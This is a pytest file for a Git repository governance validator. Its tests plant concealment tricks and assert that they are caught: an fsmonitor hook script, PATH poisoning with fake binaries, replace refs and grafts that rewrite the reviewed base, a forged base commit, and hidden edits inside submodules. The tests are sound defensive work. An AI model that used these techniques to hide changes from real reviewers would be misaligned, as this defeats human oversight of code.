def test_worktree_scoped_git_configuration_is_rejected(
    governed_repo: tuple[Path, FixedRunner],
) -> None:
    root, runner = governed_repo
    git(root, "config", "extensions.worktreeConfig", "true")
    git(root, "config", "--worktree", "filter.hide.clean", "sed /semantic/d")
    report = validate_fixture(root, runner)
    path_check = result_by_id(report, "path-ownership")
    assert path_check["status"] == "fail"
    assert "extensions.worktreeConfig is not allowed" in " ".join(
        path_check["diagnostics"]
    )


def test_raw_index_comparison_catches_same_size_restored_mtime_edit(
    governed_repo: tuple[Path, FixedRunner],
) -> None:
    root, runner = governed_repo
    target = root / "authority" / "current.md"
    original = target.read_bytes()
    original_stat = target.stat()
    replacement = original.replace(b"Local", b"Focal")
    assert len(replacement) == len(original)
    git(root, "config", "core.trustctime", "false")
    git(root, "config", "core.checkStat", "minimal")
    target.write_bytes(replacement)
    os.utime(target, ns=(original_stat.st_atime_ns, original_stat.st_mtime_ns))

    report = validate_fixture(root, runner)
    path_check = result_by_id(report, "path-ownership")
    assert path_check["status"] == "fail"
    assert "authority/current.md" in " ".join(path_check["diagnostics"])


@pytest.mark.parametrize(
    ("key", "value"),
    [
        ("core.fsmonitor", "true"),
        ("core.ignoreStat", "true"),
        ("core.untrackedCache", "true"),
    ],
)
def test_effective_git_stat_cache_overrides_are_rejected(
    governed_repo: tuple[Path, FixedRunner], key: str, value: str
) -> None:
    root, runner = governed_repo
    git(root, "config", key, value)
    report = validate_fixture(root, runner)
    path_check = result_by_id(report, "path-ownership")
    assert path_check["status"] == "fail"
    assert "effective Git config can conceal bytes" in " ".join(
        path_check["diagnostics"]
    )


def test_fsmonitor_hook_is_rejected_before_it_can_execute(
    governed_repo: tuple[Path, FixedRunner], tmp_path: Path
) -> None:
    root, runner = governed_repo
    marker = tmp_path / "fsmonitor-executed"
    hook = tmp_path / "fsmonitor-hook.sh"
    hook.write_text(
        "#!/bin/sh\nprintf planted > '" + str(marker) + "'\nexit 0\n",
        encoding="utf-8",
    )
    hook.chmod(0o755)
    git(root, "config", "core.fsmonitor", str(hook))

    path_check = result_by_id(validate_fixture(root, runner), "path-ownership")
    assert path_check["status"] == "fail"
    assert "effective Git config can conceal bytes" in " ".join(
        path_check["diagnostics"]
    )
    assert not marker.exists()


def test_host_tool_resolution_ignores_caller_path(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    poison = tmp_path / "poison"
    poison.mkdir()
    for name in ("git", "npm", "node"):
        candidate = poison / name
        candidate.write_text("#!/bin/sh\nexit 91\n", encoding="utf-8")
        candidate.chmod(0o755)
    monkeypatch.setenv("PATH", str(poison))

    assert poison not in VALIDATOR._trusted_host_executable("git", ROOT).parents
    assert poison not in RUNNER._trusted_executable("npm").parents


@pytest.mark.parametrize(
    "arguments",
    [
        ["new", "change", "unregistered-fourth"],
        ["update", "--force"],
        ["context", "--code-workspace", "/tmp/planted.code-workspace"],
        ["context", "--code-workspace=/tmp/planted.code-workspace"],
        ["context", "--store=external"],
        ["status", "--change", "change-one", "--schema=spec-driven"],
        ["schema", "fork", "scientific-change", "mutated"],
    ],
)
def test_wrapper_denies_mutating_or_semantics_overriding_commands(
    arguments: list[str],
) -> None:
    with pytest.raises(ValueError):
        RUNNER._enforce_command_allowlist(arguments)


def test_wrapper_preflight_recognizes_global_options_before_operations() -> None:
    assert RUNNER._preflight_request(
        [
            "--no-color",
            "instructions",
            "apply",
            "--change",
            "phase2-method-freeze",
            "--json",
        ]
    ) == ("apply", "phase2-method-freeze")
    assert RUNNER._preflight_request(
        ["--no-color", "archive", "adopt-scientific-openspec", "--yes"]
    ) == ("archive", "adopt-scientific-openspec")


@pytest.mark.parametrize("variable", ["GIT_DIR", "GIT_WORK_TREE", "GIT_INDEX_FILE"])
def test_git_environment_overrides_are_rejected_and_not_inherited(
    governed_repo: tuple[Path, FixedRunner],
    monkeypatch: pytest.MonkeyPatch,
    variable: str,
) -> None:
    root, runner = governed_repo
    monkeypatch.setenv(variable, "/tmp/planted-git-override")
    report = validate_fixture(root, runner)
    path_check = result_by_id(report, "path-ownership")
    assert path_check["status"] == "fail"
    assert f"Git environment override is forbidden: {variable}" in " ".join(
        path_check["diagnostics"]
    )
    assert all(variable not in environment for environment in runner.environments)


def test_git_replace_refs_cannot_rewrite_the_reviewed_base(
    governed_repo: tuple[Path, FixedRunner],
) -> None:
    root, runner = governed_repo
    base = git(root, "rev-parse", "HEAD")
    git(root, "commit", "--allow-empty", "-q", "-m", "replacement target")
    replacement = git(root, "rev-parse", "HEAD")
    git(root, "replace", base, replacement)
    try:
        report = VALIDATOR.validate_repository(
            root, runner=runner, expected_base_commit=base
        )
        path_check = result_by_id(report, "path-ownership")
        assert path_check["status"] == "fail"
        assert any("replacement refs" in item for item in path_check["diagnostics"])
    finally:
        git(root, "replace", "-d", base)


def test_git_grafts_cannot_rewrite_the_reviewed_base(
    governed_repo: tuple[Path, FixedRunner],
) -> None:
    root, runner = governed_repo
    graft_raw = git(root, "rev-parse", "--git-path", "info/grafts")
    graft = Path(graft_raw)
    if not graft.is_absolute():
        graft = root / graft
    graft.parent.mkdir(parents=True, exist_ok=True)
    base = git(root, "rev-parse", "HEAD")
    graft.write_text(f"{base} {base}\n", encoding="utf-8")
    try:
        report = validate_fixture(root, runner)
        path_check = result_by_id(report, "path-ownership")
        assert path_check["status"] == "fail"
        assert any("Git grafts" in item for item in path_check["diagnostics"])
    finally:
        graft.unlink()


def test_manifest_cannot_move_base_forward_to_hide_a_committed_path(
    governed_repo: tuple[Path, FixedRunner],
) -> None:
    root, runner = governed_repo
    governance_path = root / "openspec" / "changes" / "change-one" / "governance.json"
    governance = json.loads(governance_path.read_text(encoding="utf-8"))
    reviewed_base = governance["baseCommit"]
    rogue = root / "rogue-before-forged-base.txt"
    rogue.write_text("must remain visible\n", encoding="utf-8")
    git(root, "add", "rogue-before-forged-base.txt")
    git(root, "commit", "-q", "-m", "rogue committed change")
    governance["baseCommit"] = git(root, "rev-parse", "HEAD")
    write_json(governance_path, governance)
    report = VALIDATOR.validate_repository(
        root, runner=runner, expected_base_commit=reviewed_base
    )
    authority = result_by_id(report, "authority-bindings")
    path_check = result_by_id(report, "path-ownership")
    assert authority["status"] == "fail"
    assert any("reviewed bootstrap base" in item for item in authority["diagnostics"])
    assert path_check["status"] == "fail"
    assert any("base moved" in item for item in path_check["diagnostics"])
    assert any("rogue-before-forged-base.txt" in item for item in path_check["diagnostics"])


def test_submodule_ignore_configuration_is_rejected(
    governed_repo: tuple[Path, FixedRunner],
) -> None:
    root, runner = governed_repo
    git(root, "config", "submodule.upstream/example.ignore", "all")
    try:
        report = validate_fixture(root, runner)
        path_check = result_by_id(report, "path-ownership")
        assert path_check["status"] == "fail"
        assert any("submodule ignore configuration" in item for item in path_check["diagnostics"])
    finally:
        git(root, "config", "--unset-all", "submodule.upstream/example.ignore")


def test_initialized_submodule_index_flags_cannot_hide_nested_edit(
    governed_repo: tuple[Path, FixedRunner], tmp_path: Path
) -> None:
    root, runner = governed_repo
    source = tmp_path / "submodule-source"
    source.mkdir()
    git(source, "init", "-q")
    git(source, "config", "user.name", "fixture")
    git(source, "config", "user.email", "fixture@example.invalid")
    nested_source = source / "nested.txt"
    nested_source.write_text("frozen\n", encoding="utf-8")
    git(source, "add", "nested.txt")
    git(source, "commit", "-q", "-m", "nested base")
    git(
        root,
        "-c",
        "protocol.file.allow=always",
        "submodule",
        "add",
        "-q",
        str(source),
        "vendor/sample",
    )
    governance_path = root / "openspec" / "changes" / "change-one" / "governance.json"
    governance = json.loads(governance_path.read_text(encoding="utf-8"))
    governance["pathOwnership"]["allowed"].extend([".gitmodules", "vendor/sample"])
    write_json(governance_path, governance)
    submodule = root / "vendor" / "sample"
    git(submodule, "update-index", "--assume-unchanged", "nested.txt")
    nested = submodule / "nested.txt"
    original = nested.read_bytes()
    try:
        nested.write_bytes(original + b"concealed nested edit\n")
        report = validate_fixture(root, runner)
        path_check = result_by_id(report, "path-ownership")
        assert path_check["status"] == "fail"
        assert any(
            "submodule vendor/sample: assume-unchanged or skip-worktree" in item
            for item in path_check["diagnostics"]
        )
    finally:
        nested.write_bytes(original)
        git(submodule, "update-index", "--no-assume-unchanged", "nested.txt")


def test_initialized_submodule_raw_bytes_defeat_stat_cache_concealment(
    governed_repo: tuple[Path, FixedRunner], tmp_path: Path
) -> None:
    root, runner = governed_repo
    source = tmp_path / "submodule-raw-source"
    source.mkdir()
    git(source, "init", "-q")
    git(source, "config", "user.name", "fixture")
    git(source, "config", "user.email", "fixture@example.invalid")
    nested_source = source / "nested.txt"
    nested_source.write_text("frozen\n", encoding="utf-8")
    git(source, "add", "nested.txt")
    git(source, "commit", "-q", "-m", "nested base")
    git(
        root,
        "-c",
        "protocol.file.allow=always",
        "submodule",
        "add",
        "-q",
        str(source),
        "vendor/raw-sample",
    )
    governance_path = root / "openspec" / "changes" / "change-one" / "governance.json"
    governance = json.loads(governance_path.read_text(encoding="utf-8"))
    governance["pathOwnership"]["allowed"].extend([".gitmodules", "vendor/raw-sample"])
    write_json(governance_path, governance)
    submodule = root / "vendor" / "raw-sample"
    nested = submodule / "nested.txt"
    original = nested.read_bytes()
    original_stat = nested.stat()
    git(submodule, "config", "core.trustctime", "false")
    git(submodule, "config", "core.checkStat", "minimal")
    nested.write_bytes(b"fr0zen\n")
    assert len(nested.read_bytes()) == len(original)
    os.utime(nested, ns=(original_stat.st_atime_ns, original_stat.st_mtime_ns))

    report = validate_fixture(root, runner)
    path_check = result_by_id(report, "path-ownership")
    assert path_check["status"] == "fail"
    assert "raw tracked bytes differ from the nested index" in " ".join(
        path_check["diagnostics"]
    )


def test_initialized_submodule_ignored_payload_is_rejected(
    governed_repo: tuple[Path, FixedRunner], tmp_path: Path
) -> None:
    root, runner = governed_repo
    source = tmp_path / "submodule-ignored-source"
    source.mkdir()
    git(source, "init", "-q")
    git(source, "config", "user.name", "fixture")
    git(source, "config", "user.email", "fixture@example.invalid")
    (source / ".gitignore").write_text("target/\n", encoding="utf-8")
    (source / "nested.txt").write_text("frozen\n", encoding="utf-8")
    git(source, "add", ".gitignore", "nested.txt")
    git(source, "commit", "-q", "-m", "nested base")
    git(
        root,
        "-c",
        "protocol.file.allow=always",
        "submodule",
        "add",
        "-q",
        str(source),
        "vendor/ignored-sample",
    )
    governance_path = root / "openspec" / "changes" / "change-one" / "governance.json"
    governance = json.loads(governance_path.read_text(encoding="utf-8"))
    governance["pathOwnership"]["allowed"].extend(
        [".gitmodules", "vendor/ignored-sample"]
    )
    write_json(governance_path, governance)
    hidden = root / "vendor" / "ignored-sample" / "target" / "hidden.bin"
    hidden.parent.mkdir()
    hidden.write_bytes(b"ignored nested payload\n")

    path_check = result_by_id(validate_fixture(root, runner), "path-ownership")
    assert path_check["status"] == "fail"
    assert "vendor/ignored-sample" in " ".join(path_check["diagnostics"])
    assert "target/hidden.bin" in " ".join(path_check["diagnostics"])


def test_uninitialized_submodule_directory_must_be_empty(
    governed_repo: tuple[Path, FixedRunner], tmp_path: Path
) -> None:
    root, runner = governed_repo
    source = tmp_path / "submodule-uninitialized-source"
    source.mkdir()
    git(source, "init", "-q")
    git(source, "config", "user.name", "fixture")
    git(source, "config", "user.email", "fixture@example.invalid")
    (source / "nested.txt").write_text("frozen\n", encoding="utf-8")
    git(source, "add", "nested.txt")
    git(source, "commit", "-q", "-m", "nested base")
    git(
        root,
        "-c",
        "protocol.file.allow=always",
        "submodule",
        "add",
        "-q",
        str(source),
        "vendor/uninitialized-sample",
    )
    governance_path = root / "openspec" / "changes" / "change-one" / "governance.json"
    governance = json.loads(governance_path.read_text(encoding="utf-8"))
    governance["pathOwnership"]["allowed"].extend(
        [".gitmodules", "vendor/uninitialized-sample"]
    )
    write_json(governance_path, governance)
    submodule = root / "vendor" / "uninitialized-sample"
    shutil.rmtree(submodule)
    submodule.mkdir()
    (submodule / "hidden.bin").write_bytes(b"untracked nested payload\n")

    path_check = result_by_id(validate_fixture(root, runner), "path-ownership")
    assert path_check["status"] == "fail"
    assert "uninitialized gitlink contains untracked bytes" in " ".join(
        path_check["diagnostics"]
    )
